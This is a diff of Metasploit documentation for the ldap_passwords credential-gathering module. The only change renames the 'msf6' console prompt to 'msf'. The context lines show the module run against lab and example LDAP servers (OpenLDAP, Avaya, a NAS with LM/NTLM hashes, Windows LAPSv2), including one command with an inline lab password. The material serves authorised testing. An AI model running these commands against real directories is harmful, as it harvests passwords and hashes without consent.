@@ -21,7 +21,7 @@ Creating bitnami-docker-openldap_openldap_1 ... done
 ```
 
 ```
-msf6 auxiliary(gather/ldap_passwords) > rerun ldap://:@127.0.0.1:1389
+msf auxiliary(gather/ldap_passwords) > rerun ldap://:@127.0.0.1:1389
 [*] Reloading module...
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
 [*] Discovered base DN: dc=example,dc=org
@@ -32,7 +32,7 @@ msf6 auxiliary(gather/ldap_passwords) > rerun ldap://:@127.0.0.1:1389
 [*] Found 2 entries and 2 credentials in 'dc=example,dc=org'.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_passwords) >
+msf auxiliary(gather/ldap_passwords) >
 ```
 
 ### Setup (Windows LAPSv1)
@@ -71,7 +71,7 @@ searches for.
 ### Avaya Communication Manager via anonymous bind
 
 ```
-msf6 auxiliary(gather/ldap_passwords) > options
+msf auxiliary(gather/ldap_passwords) > options
 
 Module options (auxiliary/gather/ldap_passwords):
 
@@ -105,10 +105,10 @@ Module options (auxiliary/gather/ldap_passwords):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
+msf auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
 RHOSTS => 192.0.2.1
 
-msf6 auxiliary(gather/ldap_passwords) > run
+msf auxiliary(gather/ldap_passwords) > run
 [*] Discovered base DN: dc=vsp
 [*] The target LDAP server is not an Active Directory Domain Controller.
 [*] Searching base DN: dc=vsp
@@ -122,7 +122,7 @@ msf6 auxiliary(gather/ldap_passwords) > run
 ### NASDeluxe - NAS with Samba LM/NTLM hashes
 
 ```
-msf6 auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
+msf auxiliary(gather/ldap_passwords) > set RHOSTS 192.0.2.1
 RHOSTS => 192.0.2.1
 
 msf5 auxiliary(gather/ldap_passwords) > run
@@ -140,7 +140,7 @@ msf5 auxiliary(gather/ldap_passwords) > run
 
 ### Windows Server 2019 - LAPSv2 with Encryption
 ```
-msf6 auxiliary(gather/ldap_passwords) > run ldap://msflab.local;smcintyre:Password1!@192.0.2.10
+msf auxiliary(gather/ldap_passwords) > run ldap://msflab.local;smcintyre:Password1!@192.0.2.10
 [*] Discovered base DN: DC=msflab,DC=local
 [*] The target LDAP server is an Active Directory Domain Controller.
 [*] Searching base DN: DC=msflab,DC=local
@@ -148,5 +148,5 @@ msf6 auxiliary(gather/ldap_passwords) > run ldap://msflab.local;smcintyre:Passwo
 [*] Found 1 entries and 1 credentials in 'DC=msflab,DC=local'.
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_passwords) >
+msf auxiliary(gather/ldap_passwords) >
 ```
